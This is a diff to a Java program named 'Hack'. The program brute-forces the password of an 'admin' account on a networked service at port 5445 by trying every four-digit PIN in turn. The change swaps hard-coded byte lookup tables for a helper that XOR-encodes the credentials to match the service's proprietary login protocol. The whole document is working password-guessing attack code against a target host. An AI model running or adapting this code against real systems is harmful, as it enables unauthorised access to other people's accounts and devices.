@@ -41,62 +41,26 @@ public class Hack {
   private static final String HOSTNAME = "enter-your-hostname-here";
   private final InetAddress HOST;
   private static final int PORT = 5445;
+  private static final String USER = "admin"; // Must be 5 characters.
 
-  Map<Character, Byte> FIRST = new HashMap<>();
-  Map<Character, Byte> SECOND = new HashMap<>();
-  Map<Character, Byte> THIRD = new HashMap<>();
-  Map<Character, Byte> FOURTH = new HashMap<>();
+  private static final byte[] USER_XOR_PATTERN = {
+    (byte) 0xe1,
+    (byte) 0x1f,
+    (byte) 0xf0,
+    (byte) 0xe7,
+    (byte) 0xee,
+  };
 
-  byte USER_ADMIN[] = new byte[] { (byte) 0x80, 0x7b, (byte) 0x9d, (byte) 0x8e,
-      (byte) 0x80 };
+  private static final byte[] PASS_XOR_PATTERN = {
+    (byte) 0x67,
+    (byte) 0x99,
+    (byte) 0xa8,
+    (byte) 0xaa
+  };
 
   int sequence = 0x1e;
 
   public Hack() throws Exception {
-    FIRST.put('0', (byte) 0x57);
-    FIRST.put('1', (byte) 0x56);
-    FIRST.put('2', (byte) 0x55);
-    FIRST.put('3', (byte) 0x54);
-    FIRST.put('4', (byte) 0x53);
-    FIRST.put('5', (byte) 0x52);
-    FIRST.put('6', (byte) 0x51);
-    FIRST.put('7', (byte) 0x50);
-    FIRST.put('8', (byte) 0x5f);
-    FIRST.put('9', (byte) 0x5e);
-
-    SECOND.put('0', (byte) 0xa9);
-    SECOND.put('1', (byte) 0xa8);
-    SECOND.put('2', (byte) 0xab);
-    SECOND.put('3', (byte) 0xaa);
-    SECOND.put('4', (byte) 0xad);
-    SECOND.put('5', (byte) 0xac);
-    SECOND.put('6', (byte) 0xaf);
-    SECOND.put('7', (byte) 0xae);
-    SECOND.put('8', (byte) 0xa1);
-    SECOND.put('9', (byte) 0xa0);
-
-    THIRD.put('0', (byte) 0x98);
-    THIRD.put('1', (byte) 0x99);
-    THIRD.put('2', (byte) 0x9a);
-    THIRD.put('3', (byte) 0x9b);
-    THIRD.put('4', (byte) 0x9c);
-    THIRD.put('5', (byte) 0x9d);
-    THIRD.put('6', (byte) 0x9e);
-    THIRD.put('7', (byte) 0x9f);
-    THIRD.put('8', (byte) 0x90);
-    THIRD.put('9', (byte) 0x91);
-
-    FOURTH.put('0', (byte) 0x9a);
-    FOURTH.put('1', (byte) 0x9b);
-    FOURTH.put('2', (byte) 0x98);
-    FOURTH.put('3', (byte) 0x99);
-    FOURTH.put('4', (byte) 0x9e);
-    FOURTH.put('5', (byte) 0x9f);
-    FOURTH.put('6', (byte) 0x9c);
-    FOURTH.put('7', (byte) 0x9d);
-    FOURTH.put('8', (byte) 0x92);
-    FOURTH.put('9', (byte) 0x93);
-
     HOST = InetAddress.getByName(HOSTNAME);
   }
 
@@ -104,7 +68,7 @@ public class Hack {
     for (int i = 0; i <= 9999; ++i) {
       Thread.sleep(500);  // may not be necessary.
       String password = String.format("%04d", i);
-      if (attempt(USER_ADMIN, password)) {
+      if (attempt(USER, password)) {
         System.out.println("\nThe password is " + password);
         return;
       } else {
@@ -113,7 +77,7 @@ public class Hack {
     }
   }
 
-  private boolean attempt(byte user[], String password) {
+  private boolean attempt(String user, String password) {
     while (true) {
       try {
         return attemptInternal(user, password);
@@ -123,7 +87,7 @@ public class Hack {
     }
   }
 
-  private boolean attemptInternal(byte user[], String password) throws Exception {
+  private boolean attemptInternal(String user, String password) throws Exception {
     Socket socket = new Socket(HOST, PORT);
     OutputStream output = socket.getOutputStream();
     InputStream input = socket.getInputStream();
@@ -147,20 +111,18 @@ public class Hack {
 
     req.write(new byte[] { 0x63, 0x24, 0x4e });
 
-    req.write(user);
+    // username
+    req.write(xorCharsWithPattern(user, USER_XOR_PATTERN));
 
-    req.write(new byte[] { 0x67, (byte) 0x99, (byte) 0xa8, (byte) 0xaa });
+    req.write(PASS_XOR_PATTERN);
     req.write(new byte[] { (byte) 0xbe, 0x5e, 0x48, 0x02, (byte) 0x98, 0x4e });
-    req.write(new byte[] { (byte) 0xe1, 0x1f, (byte) 0xf0, (byte) 0xe7, (byte) 0xee });
+    req.write(USER_XOR_PATTERN);
 
     // password
-    req.write(FIRST.get(password.charAt(0)));
-    req.write(SECOND.get(password.charAt(1)));
-    req.write(THIRD.get(password.charAt(2)));
-    req.write(FOURTH.get(password.charAt(3)));
+    req.write(xorCharsWithPattern(password, PASS_XOR_PATTERN));
 
     req.write(new byte[] { (byte) 0xbe, 0x5e, 0x48, 0x02, (byte) 0x98, 0x4e });
-    req.write(new byte[] { (byte) 0xe1, 0x1f, (byte) 0xf0, (byte) 0xe7, (byte) 0xee });
+    req.write(USER_XOR_PATTERN);
 
     req.write(new byte[] { 0x67, (byte) 0x99, (byte) 0xa8, (byte) 0xaa,
         (byte) 0xbe, 0x5e, 0x48, 0x02, (byte) 0x88 });
@@ -208,6 +170,17 @@ public class Hack {
     String sessionIdText = fragment.substring(0, index);
     // System.out.println("Session id is [" + sessionIdText + "]");
     return Integer.parseInt(sessionIdText);
+  }
+
+  // XORs the characters in String str with the bytes from the pattern.
+  private static byte[] xorCharsWithPattern(String str, byte[] pattern) {
+    Preconditions.checkState(str.length() == pattern.length);
+    char[] chars = str.toCharArray();
+    byte[] result = new byte[chars.length];
+    for (int i = 0; i < chars.length; i++) {
+      result[i] = (byte) (chars[i] ^ pattern[i]);
+    }
+    return result;
   }
 
 }
